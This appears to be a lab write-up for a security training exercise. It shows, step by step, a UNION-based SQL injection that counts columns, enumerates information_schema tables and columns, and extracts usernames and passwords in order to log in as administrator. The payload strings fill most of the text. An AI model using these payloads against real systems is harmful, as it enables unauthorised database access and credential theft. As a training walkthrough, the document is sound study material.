
### SQL injection attack, listing the database contents on non-Oracle databases : PRACTITIONER

---

> First, we find out the number of columns in the output query using the `ORDER BY` technique. keep increasing the index until an error is recieved.
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
> Get an error at 3, hence we have 2 columns.

> Next, we need to find the data types of these columns.
```
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--
```
> Both are text fields.

> Next we need to find the user table in order to get the usernames and passwords. Using the `information_schema` database, listing the TABLE_NAMEs of all tables.
```
' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- 
```

> Try the `users_oxepzf` table and list the columns of that table.
```
' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name='users_oxepzf'--
```
> We get to column names as output:
* username_kscelq
* password_lyarmh

> We can now construct a normal query to get the data in these columns.
```
' UNION SELECT username_kscelq, password_lyarmh FROM users_oxepzf -- 
```

>This lists the usernames and passwords of all users present in the `users_oxepzf` table.

![adminpassword](./screenshots/pass.png)
> We can then use the administrator and his password to login as admin and complete the lab.

---
